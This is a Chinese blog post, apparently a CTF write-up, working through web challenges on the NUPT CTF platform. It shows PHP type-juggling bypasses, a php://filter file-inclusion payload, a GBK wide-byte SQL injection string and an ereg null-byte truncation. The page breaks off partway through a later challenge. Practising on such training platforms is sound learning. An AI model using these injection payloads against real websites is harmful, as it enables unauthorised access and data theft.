<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">



<title>南邮 CTF 平台题记 | C0r1&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


</head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">c0r1&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">c0r1&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">南邮 CTF 平台题记</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">c0r1</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">September 26, 2019&nbsp;&nbsp;9:21:55</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;-Web-&#x9898;&#x8BB0;"><a href="#&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;-Web-&#x9898;&#x8BB0;" class="headerlink" title="&#x5357;&#x90AE; CTF &#x5E73;&#x53F0; Web &#x9898;&#x8BB0;"></a>&#x5357;&#x90AE; CTF &#x5E73;&#x53F0; Web &#x9898;&#x8BB0;</h1><p><strong>&#x5E73;&#x53F0;&#x5730;&#x5740;&#xFF1A;<a href="https://cgctf.nuptsast.com/" target="_blank" rel="noopener">https://cgctf.nuptsast.com</a></strong></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-1-&#x7B7E;&#x5230;&#x9898;"><a href="#1-1-&#x7B7E;&#x5230;&#x9898;" class="headerlink" title="1.1 &#x7B7E;&#x5230;&#x9898;"></a>1.1 &#x7B7E;&#x5230;&#x9898;</h3><p>&#x67E5;&#x770B;&#x6E90;&#x7801;&#x5373;&#x53EF;</p>
<h3 id="1-2-MD5-Collision"><a href="#1-2-MD5-Collision" class="headerlink" title="1.2 MD5 Collision"></a>1.2 MD5 Collision</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$md51 = md5(<span class="string">&apos;QNKCDZO&apos;</span>);</span><br><span class="line">$a = @$_GET[<span class="string">&apos;a&apos;</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a)){</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">&apos;QNKCDZO&apos;</span> &amp;&amp; $md51 == $md52) {</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nctf{*****************}&quot;</span>;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;false!!!&quot;</span>;</span><br><span class="line">}}</span><br><span class="line"><span class="keyword">else</span>{<span class="keyword">echo</span> <span class="string">&quot;please input a&quot;</span>;}</span><br></pre></td></tr></table></figure>

<p>&#x5F53;&#x8FDB;&#x884C;&#x677E;&#x6563;&#x6BD4;&#x8F83;&#xFF08; <code>==</code> &#xFF09;&#xFF0C;&#x4E24;&#x503C;&#x88AB;&#x8F6C;&#x6362;&#x4E3A;&#x6570;&#x503C;&#x5F62;&#x5F0F;&#x8868;&#x793A;&#xFF0C;<code>0E</code> &#x5F00;&#x5934;&#x8868;&#x793A;&#x7684;&#x6570;&#xFF08;&#x79D1;&#x5B66;&#x8BA1;&#x6570;&#x6CD5;&#xFF09;&#x90FD;&#x4E3A; 0&#xFF0C;&#x56E0;&#x6B64;&#x518D;&#x627E;&#x4E00;&#x4E2A; MD5 &#x503C;&#x524D;&#x4E24;&#x4F4D;&#x4EE5; <code>0E</code> &#x5F00;&#x5934;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5373;&#x53EF;&#x6EE1;&#x8DB3;&#x5224;&#x65AD;&#x6761;&#x4EF6; &#x3002;</p>
<h3 id="1-3-&#x7B7E;&#x5230;&#x4E8C;"><a href="#1-3-&#x7B7E;&#x5230;&#x4E8C;" class="headerlink" title="1.3 &#x7B7E;&#x5230;&#x4E8C;"></a>1.3 &#x7B7E;&#x5230;&#x4E8C;</h3><p>&#x8F93;&#x5165;&#x6846;&#x9650;&#x5236;&#x4E86;&#x8F93;&#x5165;&#x957F;&#x5EA6;&#xFF0C;&#x5BA1;&#x67E5;&#x5143;&#x7D20;&#x589E;&#x52A0; <code>maxlength</code> &#x6570;&#x503C;</p>
<h3 id="1-4-&#x8FD9;&#x9898;&#x4E0D;&#x662F;-WEB"><a href="#1-4-&#x8FD9;&#x9898;&#x4E0D;&#x662F;-WEB" class="headerlink" title="1.4 &#x8FD9;&#x9898;&#x4E0D;&#x662F; WEB"></a>1.4 &#x8FD9;&#x9898;&#x4E0D;&#x662F; WEB</h3><p>&#x731C;&#x6D4B;&#x662F;&#x56FE;&#x7247;&#x9690;&#x5199;&#x65B9;&#x5411;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x5148;&#x4E22;&#x5230; Stegsolve &#x91CC;&#x9762;&#x67E5;&#x770B;&#x65E0;&#x679C;&#x3002;&#x60F3;&#x7740;&#x4F1A;&#x4E0D;&#x4F1A;&#x662F;&#x56FE;&#x7247;&#x9A6C;&#x5F62;&#x5F0F;&#xFF0C;&#x9042;&#x4E22;&#x5230; notepad++ &#x91CC;&#x9762;&#x641C;&#x7D22;&#x5B57;&#x7B26;&#x4E32; <code>flag</code> &#x65E0;&#x679C;&#x3002;&#x55EF; &#x2026; <code>nctf{</code></p>
<h3 id="1-5-&#x5C42;&#x5C42;&#x9012;&#x8FDB;"><a href="#1-5-&#x5C42;&#x5C42;&#x9012;&#x8FDB;" class="headerlink" title="1.5 &#x5C42;&#x5C42;&#x9012;&#x8FDB;"></a>1.5 &#x5C42;&#x5C42;&#x9012;&#x8FDB;</h3><p>&#x6253;&#x5F00;&#x7F51;&#x9875; - &#x641C;&#x7D22;&#x6846;&#x6D4B;&#x8BD5; - &#x8DF3;&#x8F6C;&#x5916;&#x7AD9; &#x3002;&#x3002;&#x3002;</p>
<p>&#x67E5;&#x770B;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x8C03;&#x7528;&#x4E86; <code>SO.html</code> &#xFF0C;&#x8FFD;&#x8FDB;&#x53BB;&#x67E5;&#x770B;&#x5176;&#x5185;&#x5BB9;&#x53C8;&#x8C03;&#x7528;&#x4E86; <code>S0.htm</code> &#xFF0C;&#x8FFD;&#x5165;&#x67E5;&#x770B; <code>SO.htm -&gt; S0.htm -&gt; 404.html</code></p>
<p>&#x67E5;&#x770B;&#x53EF;&#x7591;&#x7684; 404 &#x9875;&#x9762;&#xFF0C;&#x83B7;&#x53D6; flag</p>
<h3 id="1-6-AAencode"><a href="#1-6-AAencode" class="headerlink" title="1.6 AAencode"></a>1.6 AAencode</h3><p>&#x719F;&#x6089;&#x7684;&#x7F16;&#x7801;&#x6C14;&#x606F;&#xFF0C;&#x6362;&#x6210; UTF-8 &#x7F16;&#x7801;&#xFF0C;&#x4E22;&#x5165; Chrome Console &#x6267;&#x884C;&#x5373;&#x53EF;</p>
<h3 id="1-7-&#x5355;&#x8EAB;&#x4E8C;&#x5341;&#x5E74;"><a href="#1-7-&#x5355;&#x8EAB;&#x4E8C;&#x5341;&#x5E74;" class="headerlink" title="1.7 &#x5355;&#x8EAB;&#x4E8C;&#x5341;&#x5E74;"></a>1.7 &#x5355;&#x8EAB;&#x4E8C;&#x5341;&#x5E74;</h3><p>&#x67D0;&#x4E0D;&#x77E5;&#x540D;&#x5927;&#x4F6C;&#x6559;&#x5BFC;&#x8FC7; &#x201D;&#x4E0D;&#x5F00;BP&#xFF0C;&#x6E17;&#x900F;&#x6D4B;&#x6BDB;&#x201C;</p>
<p>Burp Suite &#x8BA9;&#x524D;&#x7AEF;&#x82B1;&#x62DB;&#x65E0;&#x5904;&#x9041;&#x5F62;&#xFF0C;&#x54C8;&#x54C8;&#x3002;</p>
<h3 id="1-8-PHP-Decode"><a href="#1-8-PHP-Decode" class="headerlink" title="1.8 PHP Decode"></a>1.8 PHP Decode</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CLsI</span><span class="params">($ZzvSWE)</span> </span>{</span><br><span class="line"> </span><br><span class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($ZzvSWE); $i++) {</span><br><span class="line"> </span><br><span class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - <span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> $ZzvSWE;</span><br><span class="line"> </span><br><span class="line">}</span><br><span class="line"><span class="keyword">eval</span>(CLsI(<span class="string">&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x4E00;&#x53E5;&#x8BDD;&#xFF1F;&#x5C06; <code>eval</code> &#x6539;&#x6210; <code>echo</code> &#x770B;&#x770B;&#x662F;&#x5565;&#x5185;&#x5BB9;&#xFF0C;&#x8F93;&#x51FA; <code>phpinfo();</code> &#x548C; flag &#x3002;</p>
<h3 id="1-9-&#x6587;&#x4EF6;&#x5305;&#x542B;"><a href="#1-9-&#x6587;&#x4EF6;&#x5305;&#x542B;" class="headerlink" title="1.9 &#x6587;&#x4EF6;&#x5305;&#x542B;"></a>1.9 &#x6587;&#x4EF6;&#x5305;&#x542B;</h3><p>&#x9898;&#x76EE;&#x63D0;&#x793A;&#xFF1A;LFI&#xFF08;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5305;&#x542B;&#xFF09;&#xFF0C;CTF &#x4E2D;&#x5E38;&#x5229;&#x7528; <code>php://filter</code> &#x4F2A;&#x534F;&#x8BAE;&#x8BFB;&#x53D6;&#x9875;&#x9762;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x662F;&#x7ECF; base64 &#x52A0;&#x5BC6;&#x540E;&#x7684;&#x5185;&#x5BB9;&#x3002;</p>
<p>&#x5E38;&#x89C1;&#x5229;&#x7528;&#x65B9;&#x5F0F;&#xFF1A;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>

<p>PS&#xFF1A;<code>php://filter</code> &#x4E0D;&#x53D7; <code>allow_url_fopen</code> &#x548C; <code>allow_url_include</code> &#x914D;&#x7F6E;&#x5F71;&#x54CD;&#x3002;</p>
<p>&#x89E3;&#x7801;&#x540E;&#x83B7;&#x5F97; <code>index.php</code> &#x6E90;&#x7801;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if(!$_GET[file]){echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;}</span><br><span class="line">	$file=$_GET[&apos;file&apos;];</span><br><span class="line">	if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){</span><br><span class="line">		echo &quot;Oh no!&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	}</span><br><span class="line">	include($file); </span><br><span class="line">//flag:nctf{xxxxxxxxxxxxxxxxxx}</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="1-10-&#x5355;&#x8EAB;&#x4E00;&#x767E;&#x5E74;&#x4E5F;&#x6CA1;&#x6709;&#x7528;"><a href="#1-10-&#x5355;&#x8EAB;&#x4E00;&#x767E;&#x5E74;&#x4E5F;&#x6CA1;&#x6709;&#x7528;" class="headerlink" title="1.10 &#x5355;&#x8EAB;&#x4E00;&#x767E;&#x5E74;&#x4E5F;&#x6CA1;&#x6709;&#x7528;"></a>1.10 &#x5355;&#x8EAB;&#x4E00;&#x767E;&#x5E74;&#x4E5F;&#x6CA1;&#x6709;&#x7528;</h3><p>&#x4E0A; Burp Suite &#x795E;&#x5668;&#xFF0C;&#x70B9;&#x51FB;&#x8D85;&#x94FE;&#x63A5;&#x540E;&#x8BBF;&#x95EE; <code>/web9/index.php</code> &#xFF0C;&#x8FD4;&#x56DE;&#x5305;&#x8FD4;&#x56DE; 302 &#xFF0C;&#x8DF3;&#x8F6C;&#x5230; <code>/web8/no_key_is_here_forever.php</code> &#x3002;flag &#x5728; 302 Response header &#x5934;&#x91CC;&#x9762;&#x3002;</p>
<h3 id="1-11-Download"><a href="#1-11-Download" class="headerlink" title="1.11 Download~!"></a>1.11 Download~!</h3><p>&#x9898;&#x76EE;&#x6302;&#x4E86;&#xFF0C;Pass ~</p>
<h3 id="1-12-COOKIE"><a href="#1-12-COOKIE" class="headerlink" title="1.12 COOKIE"></a>1.12 COOKIE</h3><p>Tip&#xFF1A;0 == not</p>
<p>&#x8FD9;&#x9898;&#x6211;&#x61C2;&#xFF0C;cookie &#x4E0D;&#x5C31;&#x662F;&#x5C0F;&#x997C;&#x5E72;&#x561B;</p>
<p>&#x6CA1;&#x6709;&#x5C0F;&#x997C;&#x5E72;&#x5C31;&#x4E0D;&#x7ED9; flag</p>
<p>&#x90A3;&#x4E48;&#x7B80;&#x5355;&#x4E86;&#xFF0C;EditThisCookie &#x4E3A; 1&#xFF0C;&#x5C0F;&#x997C;&#x5E72;&#x6709;&#x4E86;&#xFF0C;flag &#x8FD8;&#x4F1A;&#x8FDC;&#x5417;</p>
<p><img src="/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/Cookie.png" alt="1568974923213"></p>
<h3 id="1-13-Mysql"><a href="#1-13-Mysql" class="headerlink" title="1.13 Mysql"></a>1.13 Mysql</h3><p>&#x6253;&#x5F00; <code>robots.txt</code> &#xFF0C;&#x5F97;&#x5230; <code>Tip:sql.php</code> &#x5373; &#x5176;&#x6E90;&#x7801;&#xFF1A;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[id]) {</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">&apos;:&apos;</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id = intval($_GET[id]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">&quot;select content from ctf2 where id=&apos;$id&apos;&quot;</span>));</span><br><span class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) {</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span>{</span><br><span class="line">    <span class="keyword">echo</span>($query[content]);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li><p>&#x5C06; GET &#x65B9;&#x6CD5;&#x4F20;&#x5165;&#x53C2;&#x6570; <code>$id</code> &#x4F7F;&#x7528; <code>intval()</code> &#x8F6C;&#x6362;&#x6210;&#x6574;&#x578B;&#x540E;&#x5E26;&#x5165;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x67E5;&#x8BE2;</p>
</li>
<li><p>&#x5F53;&#x4F20;&#x5165;&#x53C2;&#x6570; <code>$_GET[id]</code> &#x4E0D;&#x7B49;&#x4E8E; 1024 &#x65F6;&#x6253;&#x5370;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;</p>
</li>
</ol>
<p>&#x6761;&#x4EF6;&#x4E8C;&#x770B;&#x4F3C;&#x65E0;&#x7528;&#xFF08;&#x5361;&#x4E86;&#x597D;&#x4E45;&#x6CA1;&#x62D0;&#x8FC7;&#x5F2F;&#x6765; ~</p>
<p>CTF &#x8D5B;&#x9898;&#x4E2D;&#x7ECF;&#x5E38;&#x5EFA;&#x7ACB;&#x8FD9;&#x79CD;&#x770B;&#x4F3C;&#x77DB;&#x76FE;&#x7684;&#x6761;&#x4EF6;&#xFF0C;&#x5B9E;&#x5219;&#x8FD9;&#x91CC;&#x660E;&#x793A;&#x4E86; flag &#x6240;&#x5728;&#x5B57;&#x6BB5;&#x53F7; id &#x4E3A; 1024</p>
<p>&#x90A3;&#x4E48;&#x8FD9;&#x91CC;&#x671F;&#x671B;&#x6EE1;&#x8DB3;&#x7684;&#x6761;&#x4EF6;&#x5C31;&#x662F;&#xFF1A;</p>
<ol>
<li><code>intval($_GET[id]) == 1024</code></li>
<li><code>$_GET[id] != 1024</code></li>
</ol>
<p>PHP &#x662F;&#x5F31;&#x7C7B;&#x578B;&#x8BED;&#x8A00;&#xFF0C;&#x5728;&#x505A;&#x677E;&#x6563;&#x6BD4;&#x8F83;&#x65F6;&#xFF08;<code>==</code>&#xFF09;&#x4F1A;&#x5148;&#x505A;&#x7C7B;&#x578B;&#x8F6C;&#x6362;&#xFF0C;&#x5C06;&#x6BD4;&#x8F83;&#x53CC;&#x65B9;&#x8F6C;&#x6362;&#x81F3;&#x76F8;&#x540C;&#x7C7B;&#x578B;&#xFF0C;&#x518D;&#x505A;&#x6570;&#x503C;&#x6BD4;&#x8F83;&#x3002;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x5206;&#x522B;&#x5F71;&#x54CD;&#x5176;&#x7C7B;&#x578B;&#x8F6C;&#x6362;&#x548C;&#x6570;&#x503C;&#x6BD4;&#x8F83;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x4F7F;&#x7A0B;&#x5E8F;&#x4EA7;&#x751F;&#x610F;&#x6599;&#x4E4B;&#x5916;&#x7684;&#x6BD4;&#x8F83;&#x7ED3;&#x679C;&#x3002;</p>
<p>&#x5229;&#x7528;&#x6D6E;&#x70B9;&#x6570;&#x7ECF;&#x8FC7; <code>intval()</code> &#x51FD;&#x6570;&#x8F6C;&#x6362;&#x524D;&#x540E;&#x4EA7;&#x751F;&#x7684;&#x5DEE;&#x5F02;&#x7ED3;&#x679C;&#x5206;&#x522B;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x4E00;&#x3001;&#x4E8C;&#x65F6;&#xFF0C;&#x5F97;&#x5230; flag&#x3002;</p>
<p><strong>&#x5F71;&#x54CD;&#x6570;&#x503C;&#x6BD4;&#x8F83;&#x7684;&#x4F8B;&#x5B50;&#x89C1; &#xFF1A;1.2 MD5 Collision</strong></p>
<h3 id="1-14-GBK-Injection"><a href="#1-14-GBK-Injection" class="headerlink" title="1.14 GBK Injection"></a>1.14 GBK Injection</h3><p>&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;&#xFF0C;payload &#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+%df%27+union+<span class="keyword">select</span>+<span class="number">1</span>,(<span class="keyword">select</span>+flag+<span class="keyword">from</span>+gbksqli)+<span class="comment">--+abc</span></span><br></pre></td></tr></table></figure>

<h3 id="1-15-x00"><a href="#1-15-x00" class="headerlink" title="1.15 /x00"></a>1.15 /x00</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">&apos;nctf&apos;</span>])) {</span><br><span class="line">        <span class="keyword">if</span> (@ereg (<span class="string">&quot;^[1-9]+$&quot;</span>, $_GET[<span class="string">&apos;nctf&apos;</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&apos;&#x5FC5;&#x987B;&#x8F93;&#x5165;&#x6570;&#x5B57;&#x624D;&#x884C;&apos;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">&apos;nctf&apos;</span>], <span class="string">&apos;#biubiubiu&apos;</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&apos;Flag: &apos;</span>.$flag);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&apos;&#x9A9A;&#x5E74;&#xFF0C;&#x7EE7;&#x7EED;&#x52AA;&#x529B;&#x5427;&#x554A;~&apos;</span>;</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>

<ol>
<li>ereg() &#x51FD;&#x6570;&#x8981;&#x6C42;&#x8F93;&#x5165;&#x5B57;&#x7B26;&#x4E32;&#x90FD;&#x7531;&#x6570;&#x5B57;&#x7EC4;&#x6210;</li>
<li>strpos() &#x51FD;&#x6570;&#x8981;&#x6C42;&#x8F93;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x8981;&#x5305;&#x542B; <code>#biubiubiu</code></li>
</ol>
<p>&#x4F9D;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6D41;&#x7A0B;&#xFF0C;&#x9996;&#x5148;&#x5206;&#x6790;&#x600E;&#x4E48;&#x7ED5;&#x8FC7; <code>ereg()</code> &#x51FD;&#x6570;&#x3002;</p>
<p>Google &#x53D1;&#x73B0; <code>ereg()</code> &#x51FD;&#x6570;&#x6709;&#x6B63;&#x5219; <code>%00</code> &#x622A;&#x65AD;&#x6F0F;&#x6D1E;&#xFF0C;&#x5E76;&#x4E14; <code>ereg()</code>&#x51FD;&#x6570;&#x9047;&#x5230;&#x6570;&#x7EC4;&#x505A;&#x53C2;&#x6570;&#x65F6;&#x8FD4;&#x56DE; <code>NULL</code>&#x3002;</p>
<p><code>strpos()</code> &#x51FD;&#x6570;&#x67E5;&#x627E;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x51FA;&#x73B0;&#x5728;&#x9996;&#x4F4D;&#x65F6;&#x8FD4;&#x56DE; <code>0</code> &#xFF0C;&#x9047;&#x5230;&#x6570;&#x7EC4;&#x505A;&#x53C2;&#x6570;&#x65F6;&#x540C;&#x6837;&#x8FD4;&#x56DE; <code>NULL</code> </p>
<p>&#x9A8C;&#x8BC1; <code>0 | false | null</code> &#x5728;&#x677E;&#x6563;&#x6BD4;&#x8F83;&#x548C;&#x4E25;&#x683C;&#x6BD4;&#x8F83;&#x4E0B;&#x7684;&#x5DEE;&#x5F02;</p>
<p>&#x4E25;&#x683C;&#x6BD4;&#x8F83;&#x4E0B; <code>0 | false | null</code> &#x4E92;&#x4E0D;&#x76F8;&#x7B49;</p>
<p><img src="/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/x001.png" alt="1568994021338"></p>
<p>&#x677E;&#x6563;&#x6BD4;&#x8F83;&#x4E0B; <code>0 | false | null</code> &#x76F8;&#x7B49;</p>
<p><img src="/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/x002.png" alt="1568994732797"></p>
<ol>
<li>&#x4F20;&#x5165;&#x53C2;&#x6570; <code>nctf=1%00%23biubiubiu</code> &#x65F6;&#xFF0C;&#x622A;&#x65AD; ereg &#x5224;&#x65AD;&#xFF0C;&#x8FDB;&#x5165;&#x4E0B;&#x5C42;&#x5224;&#x65AD;&#xFF08;PS&#xFF1A;<code>#</code> &#x4F1A;&#x6CE8;&#x91CA;&#x5176;&#x540E;&#x53C2;&#x6570;&#xFF09;</li>
<li>&#x7ED9; <code>$_GET[&apos;nctf&apos;]</code> &#x4F20;&#x5165;&#x6570;&#x7EC4;&#x505A;&#x53C2;&#x6570;&#x65F6;&#xFF0C;<code>null !== false</code> &#x5F97;&#x5230; flag</li>
</ol>
<h3 id="1-16-Bypass-again"><a href="#1-16-Bypass-again" class="headerlink" title="1.16 Bypass again"></a>1.16 Bypass again</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&apos;a&apos;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">&apos;b&apos;</span>])) {</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&apos;a&apos;</span>] != $_GET[<span class="string">&apos;b&apos;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">&apos;a&apos;</span>]) == md5($_GET[<span class="string">&apos;b&apos;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&apos;Flag: &apos;</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&apos;Wrong.&apos;</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<ol>
<li><code>$_GET[&apos;a&apos;] != $_GET[&apos;b&apos;]</code></li>
